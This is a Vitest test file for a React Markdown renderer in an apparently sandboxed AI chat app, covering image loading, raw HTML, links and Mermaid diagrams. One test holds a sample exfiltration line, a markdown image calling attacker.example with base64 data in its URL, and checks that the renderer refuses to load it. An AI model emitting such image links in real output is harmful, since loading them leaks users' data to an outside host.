import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it } from "vitest"
import { Markdown } from "./Markdown"

describe("Markdown", () => {
  // K1: The browser would load an image right away; through the URL, data could leave the sandbox
  // without internet access having been confirmed. Foreign addresses are therefore never loaded.
  it("does not load foreign images but shows only the address as text", () => {
    const text = "Here: ![secret](https://attacker.example/p?d=c2VjcmV0)"
    for (const html of [
      renderToStaticMarkup(<Markdown text={text} />),
      renderToStaticMarkup(<Markdown text={text} chatId="c1" msgId="resp-1" />),
    ]) {
      expect(html).not.toContain("<img")
      expect(html).toContain("Image not loaded")
      expect(html).toContain("attacker.example")
    }
  })
  it("does not render raw HTML", () => {
    const html = renderToStaticMarkup(<Markdown text={'<img src="https://x.example/a.png">'} chatId="c1" msgId="m" />)
    expect(html).not.toContain("<img")
  })
  it("opens links in a new tab without referrer", () => {
    const html = renderToStaticMarkup(<Markdown text="[Page](https://example.com)" />)
    expect(html).toContain('rel="noreferrer noopener"')
  })
  it("loads local images of the finished response through the orchestrator", () => {
    const html = renderToStaticMarkup(<Markdown text="![History](plot.png)" chatId="c1" msgId="resp-1" />)
    expect(html).toContain('src="api/chats/c1/images?path=%2Fworkspace%2Fplot.png&amp;msg=resp-1"')
    expect(html).toContain('alt="History"')
  })
  it("does not show local images while streaming or without a chat", () => {
    const streaming = renderToStaticMarkup(<Markdown text="![History](/workspace/plot.png)" chatId="c1" />)
    expect(streaming).not.toContain("<img")
    expect(streaming).toContain("/workspace/plot.png")
    const noChat = renderToStaticMarkup(<Markdown text="![History](/workspace/plot.png)" />)
    expect(noChat).not.toContain("<img")
    expect(noChat).toContain("Image not loaded")
  })
  it("shows data: raster images but no SVG", () => {
    const png = renderToStaticMarkup(<Markdown text="![p](data:image/png;base64,iVBORw0KGgo=)" />)
    expect(png).toContain('src="data:image/png;base64,iVBORw0KGgo="')
    const svg = renderToStaticMarkup(<Markdown text="![s](data:image/svg+xml;base64,PHN2Zz4=)" chatId="c1" msgId="m" />)
    expect(svg).not.toContain("<img")
  })

  describe("Mermaid", () => {
    const diagram = "```mermaid\ngraph TD\n  A-->B\n```"
    it("shows an open Mermaid block as source while streaming", () => {
      const html = renderToStaticMarkup(<Markdown text={"Plan:\n\n```mermaid\ngraph TD\n  A-->"} streaming />)
      expect(html).toContain("A--&gt;")
      expect(html).not.toContain("Rendering diagram")
      expect(html).not.toContain("<img")
    })
    it("renders a closed block already while streaming, a finished one always", () => {
      for (const html of [
        renderToStaticMarkup(<Markdown text={`${diagram}\n\nMore text`} streaming />),
        renderToStaticMarkup(<Markdown text={diagram} />),
      ]) {
        expect(html).toContain("Rendering diagram")
        // until the SVG is there, the source stays
        expect(html).toContain("graph TD")
      }
    })
    it("leaves other code blocks unchanged", () => {
      const html = renderToStaticMarkup(<Markdown text={"```python\nprint(1)\n```"} />)
      expect(html).toContain('<pre><code class="language-python">')
      expect(html.toLowerCase()).not.toContain("diagram")
    })
  })
})

// Review 3, N4: at most five diagrams per message on their own, large ones only on click.
describe("Markdown: many and large Mermaid diagrams", () => {
  const block = (n: number) => "```mermaid\ngraph TD\n" + Array.from({ length: n }, (_, i) => `  a${i} --> a${i + 1}`).join("\n") + "\n```"
  it("defers diagrams from the sixth on and large diagrams", () => {
    const text = [1, 2, 3, 4, 5, 6, 7].map(() => block(2)).join("\n\n")
    const html = renderToStaticMarkup(<Markdown text={text} />)
    expect(html.split("Rendering diagram").length - 1).toBe(5)
    expect(html.split("click to render").length - 1).toBe(2)
    const big = renderToStaticMarkup(<Markdown text={block(400)} />)
    expect(big).toContain("Large diagram")
    expect(big).toContain("click to render")
    expect(big).not.toContain("Rendering diagram")
  })
})
